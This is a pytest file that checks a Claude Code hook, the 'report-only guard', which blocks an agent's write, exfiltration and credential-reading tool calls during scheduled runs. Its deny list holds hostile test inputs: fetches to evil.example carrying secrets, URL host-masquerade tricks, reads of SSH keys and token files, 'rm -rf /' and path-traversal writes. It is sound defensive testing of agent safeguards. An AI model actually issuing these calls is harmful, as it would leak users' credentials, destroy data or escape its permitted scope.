"""Direct-drive drill for the report-only guard (U9 / KTD-5, Verification
Contract rows 4-5): every write/exfil path is denied under the scheduled
marker, the interactive (unmarked) path is inert including on script-error
inputs, and a malformed marker fails closed. Host-independent — drives the
hook script directly over stdin like Claude Code does.
"""
import json
import subprocess

from conftest import REPO_ROOT

GUARD = REPO_ROOT / ".claude" / "hooks" / "report-only-guard.sh"


def run_guard(payload, marked=True, marker_value="1", extra_env=None):
    env = {"PATH": "/usr/bin:/bin", "CLAUDE_PROJECT_DIR": str(REPO_ROOT)}
    if marked:
        env["CE_REPORT_ONLY"] = marker_value
    if extra_env:
        env.update(extra_env)
    if isinstance(payload, dict):
        payload = json.dumps(payload)
    return subprocess.run(
        ["bash", str(GUARD)], input=payload, env=env,
        capture_output=True, text=True, timeout=30,
    )


def tool(name, **tool_input):
    return {"tool_name": name, "tool_input": tool_input,
            "hook_event_name": "PreToolUse", "session_id": "drill"}


DENIED_UNDER_MARKER = [
    tool("Write", file_path=str(REPO_ROOT / "AGENTS.md"), content="x"),
    tool("Edit", file_path=str(REPO_ROOT / ".claude/settings.json")),
    # Path traversal must not escape the currency/ write fence.
    tool("Write", file_path="knowledge/currency/../../AGENTS.md", content="x"),
    tool("Write", file_path="knowledge/currency/../../../etc/cron.d/x", content="x"),
    # Substring escape: a currency path outside the project must not pass.
    tool("Write", file_path="/tmp/knowledge/currency/x.md", content="x"),
    # WebFetch userinfo-colon / userinfo-@ host masquerade (egress-pin bypass).
    tool("WebFetch", url="https://github.com:@evil.example/exfil?d=SECRET"),
    tool("WebFetch", url="https://github.com@evil.example/x"),
    # Broadened credential-file coverage.
    tool("Read", file_path="/Users/x/.pgpass"),
    tool("Read", file_path="/Users/x/.ssh/id_ed25519"),
    tool("Read", file_path="/Users/x/vault-password.txt"),
    tool("Bash", command="rm -rf /"),
    tool("mcp__manager-ai__prune_completed_tasks"),
    tool("mcp__manager-ai__update_file_frontmatter", file_path="x"),
    tool("WebFetch", url="https://evil.example/exfil?q=secret"),
    tool("Read", file_path="/Users/x/.ssh/id_rsa"),
    tool("Read", file_path=str(REPO_ROOT / "core/mcp/client_secret_x.json")),
    tool("Read", file_path="/Users/x/gcloud-token.json"),
    tool("Agent", prompt="spawn"),
    tool("UnknownFutureTool"),
]

ALLOWED_UNDER_MARKER = [
    tool("Write", file_path=str(REPO_ROOT / "knowledge/currency/reports/cli/2026-07-20.md"),
         content="report"),
    tool("Write", file_path="knowledge/currency/cli-baseline.json.tmp", content="{}"),
    tool("Read", file_path=str(REPO_ROOT / "docs/capabilities.md")),
    tool("WebFetch", url="https://code.claude.com/docs/en/hooks"),
    tool("WebFetch", url="https://raw.githubusercontent.com/o/r/sha/f.md"),
    tool("Skill", skill="cli-watch"),
    tool("Glob", pattern="knowledge/currency/**"),
    tool("WebSearch", query="claude code changelog"),
]


def test_marked_run_denies_every_escape_path():
    for payload in DENIED_UNDER_MARKER:
        proc = run_guard(payload, marked=True)
        assert proc.returncode == 2, (payload["tool_name"], proc.returncode, proc.stderr)
        assert "report-only guard" in proc.stderr


def test_marked_run_allows_the_report_path():
    for payload in ALLOWED_UNDER_MARKER:
        proc = run_guard(payload, marked=True)
        assert proc.returncode == 0, (payload, proc.stderr)


def test_unmarked_interactive_is_inert_on_everything():
    for payload in DENIED_UNDER_MARKER + ALLOWED_UNDER_MARKER:
        proc = run_guard(payload, marked=False)
        assert proc.returncode == 0, (payload["tool_name"], proc.stderr)


def test_malformed_marker_fails_closed():
    proc = run_guard(tool("Bash", command="ls"), marked=True, marker_value="banana")
    assert proc.returncode == 2


def test_unparseable_payload_fails_closed_only_when_marked():
    assert run_guard("not json at all", marked=True).returncode == 2
    # Script-error inputs must never block an interactive session.
    assert run_guard("not json at all", marked=False).returncode == 0
    assert run_guard("", marked=False).returncode == 0


def test_guard_independent_of_repo_state():
    """The marker is env, not a repo file: the guard denies even when
    CLAUDE_PROJECT_DIR is unset/wrong (logging degrades silently)."""
    proc = run_guard(tool("Bash", command="x"), marked=True,
                     extra_env={"CLAUDE_PROJECT_DIR": "/nonexistent"})
    assert proc.returncode == 2


def test_fetch_allowlist_extension_env():
    proc = run_guard(tool("WebFetch", url="https://extra.example/x"), marked=True,
                     extra_env={"CE_FETCH_ALLOW": "extra.example,other.example"})
    assert proc.returncode == 0


def test_validator_green_with_guard_committed_and_unwired():
    """KTD-5: the shipped state (guard present, no settings.local.json
    wiring) must not red-fail the green gate — CI and skip-adopters ship
    exactly this state."""
    import sys
    proc = subprocess.run(
        [sys.executable, str(REPO_ROOT / "core/scripts/validate.py")],
        capture_output=True, text=True, cwd=REPO_ROOT, timeout=300,
    )
    assert "report-only-guard" not in proc.stdout, (
        "validator flags the intentionally-unwired guard:\n" + proc.stdout)
